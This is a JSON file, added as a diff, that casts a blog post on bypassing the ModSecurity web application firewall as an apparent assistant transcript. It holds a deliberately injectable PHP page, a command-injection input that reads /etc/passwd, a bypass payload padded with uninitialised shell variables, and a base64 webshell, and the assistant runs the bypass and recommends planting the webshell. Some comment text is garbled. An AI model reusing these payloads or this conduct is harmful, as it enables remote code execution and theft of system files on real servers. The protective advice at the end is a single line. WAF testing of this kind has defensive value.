@@ -1,0 +1,149 @@
+{
+    "_source_md":  "WAF/2021-01-10-Modsec-WAF-bypass.md",
+    "version":  "Modsec-WAF-bypass",
+    "title":  {
+                  "zh":  "ModSecurity WAF 绕过技术实战",
+                  "en":  "ModSecurity WAF Bypass Techniques Practice"
+              },
+    "description":  {
+                        "zh":  "记录ModSecurity WAF（Apache/Nginx模块）的部署过程和绕过技术，利用未初始化变量实现WAF bypass",
+                        "en":  "Document ModSecurity WAF (Apache/Nginx module) deployment process and bypass techniques, using uninitialized variables to achieve WAF bypass"
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  "如何部署ModSecurity WAF？",
+                      "annotation":  {
+                                         "zh":  "用户请求WAF部署方法",
+                                         "en":  "User requests WAF deployment method"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# [tips] 浠ヤ笅鍥涙潯鍛戒护鐨勫惈涔夛細\n$ sed -ie \u0027s/SecDefaultAction \"phase:1,log,auditlog,pass\"/#SecDefaultAction \"phase:1,log,auditlog,pass\"/g\u0027 crs-setup.conf\n$ sed -ie \u0027s/SecDefaultAction \"phase:2,log,auditlog,pass\"/#SecDefaultAction \"phase:2,log,auditlog,pass\"/g\u0027 crs-setup.conf\n$ sed -ie \u0027s/#.*SecDefaultAction \"phase:1,log,auditlog,deny,status:403\"/SecDefaultAction \"phase:1,log,auditlog,deny,status:403\"/g\u0027 crs-setup.conf\n$ sed -ie \u0027s/# SecDefaultAction \"phase:2,log,auditlog,deny,status:403\"/SecDefaultAction \"phase:2,log,auditlog,deny,status:403\"/g\u0027 crs-setup.conf",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "cat crs-setup.conf|grep SecDefaultAction\n#SecDefaultAction \"phase:1,log,auditlog,pass\"\n#SecDefaultAction \"phase:2,log,auditlog,pass\"\n# SecDefaultAction \"phase:1,nolog,auditlog,pass\"\n# SecDefaultAction \"phase:2,nolog,auditlog,pass\"\nSecDefaultAction \"phase:1,log,auditlog,deny,status:403\"\nSecDefaultAction \"phase:2,log,auditlog,deny,status:403\"\n# SecDefaultAction \"phase:1,log,auditlog,redirect:\u0027http://%{request_headers.host}/\u0027,tag:\u0027Host: %{request_headers.host}\u0027\"\n# SecDefaultAction \"phase:2,log,auditlog,redirect:\u0027http://%{request_headers.host}/\u0027,tag:\u0027Host: %{request_headers.host}\u0027\"",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?php\n        if(isset($_GET[\u0027host\u0027])) {\n        system(\u0027dig\u0027.$_GET[\u0027host\u0027]);\n        }\n?\u003e",
+                                             "language":  "php"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "dig www.baidu.com;cat /etc/passwd\n\n; \u003c\u003c\u003e\u003e DiG 9.10.6 \u003c\u003c\u003e\u003e www.baidu.com\n;; global options: +cmd\n;; Got answer:\n;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 27659\n;; flags: qr rd; QUERY: 1, ANSWER: 3, AUTHORITY: 5, ADDITIONAL: 4\n;; WARNING: recursion requested but not available\n路路路\n路路路\n路路路\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n路路\n路路\n_oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?php system(base64_decode($_GET[\u0027CMD\u0027]));?\u003e",
+                                             "language":  "php"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "ModSecurity是开源Web应用防火墙，可作为Apache或Nginx模块部署。Nginx部署需要编译modsecurity模块。",
+                      "annotation":  {
+                                         "zh":  "介绍ModSecurity部署背景",
+                                         "en":  "Introduce ModSecurity deployment background"
+                                     }
+                  },
+                  {
+                      "type":  "tool_call",
+                      "content":  "Nginx编译安装：wget http://nginx.org/download/nginx-1.13.8.tar.gz \u0026\u0026 apt-get install libpcre3 libpcre3-dev zlib1g-dev libssl-dev \u0026\u0026 ./configure --add-module=modsecurity \u0026\u0026 make \u0026\u0026 make install",
+                      "toolName":  "bash",
+                      "annotation":  {
+                                         "zh":  "编译安装Nginx+ModSecurity",
+                                         "en":  "Compile and install Nginx+ModSecurity"
+                                     }
+                  },
+                  {
+                      "type":  "system_event",
+                      "content":  "配置modsec.conf和crs-setup.conf，设置拦截模式：SecDefaultAction \"phase:1,log,auditlog,deny,status:403\"",
+                      "annotation":  {
+                                         "zh":  "配置WAF拦截规则",
+                                         "en":  "Configure WAF blocking rules"
+                                     }
+                  },
+                  {
+                      "type":  "tool_call",
+                      "content":  "curl http://localhost?doc=/bin/ls",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "测试WAF基本拦截功能",
+                                         "en":  "Test WAF basic blocking function"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "content":  "HTTP/1.1 403 Forbidden",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "WAF成功拦截恶意请求",
+                                         "en":  "WAF successfully blocked malicious request"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  "如何绕过ModSecurity WAF？",
+                      "annotation":  {
+                                         "zh":  "用户请求WAF绕过方法",
+                                         "en":  "User requests WAF bypass method"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "绕过思路：利用未初始化变量（如$u）包裹特殊字符，绕过WAF的正则规则匹配。",
+                      "annotation":  {
+                                         "zh":  "说明WAF绕过原理",
+                                         "en":  "Explain WAF bypass principle"
+                                     }
+                  },
+                  {
+                      "type":  "tool_call",
+                      "content":  "构造绕过payload：?host=www.baidu.com;+$u+cat+/etc$u/passwd$u",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "构造WAF绕过payload",
+                                         "en":  "Construct WAF bypass payload"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "content":  "HTTP/1.1 200 OK\nroot:x:0:0:root:/root:/bin/bash\n...",
+                      "toolName":  "curl",
+                      "annotation":  {
+                                         "zh":  "成功绕过WAF执行命令",
+                                         "en":  "Successfully bypassed WAF to execute commands"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  "WAF绕过总结：1. 未初始化变量$u可包裹特殊字符绕过正则匹配 2. 利用;、\u0026\u0026等连接符构造命令链 3. 获得RCE后可写入base64编码的webshell进一步利用 4. 防护建议：升级WAF规则库、添加更多输入验证",
+                      "annotation":  {
+                                         "zh":  "总结WAF绕过技术和防护建议",
+                                         "en":  "Summarize WAF bypass techniques and protection recommendations"
+                                     }
+                  }
+              ]
+}
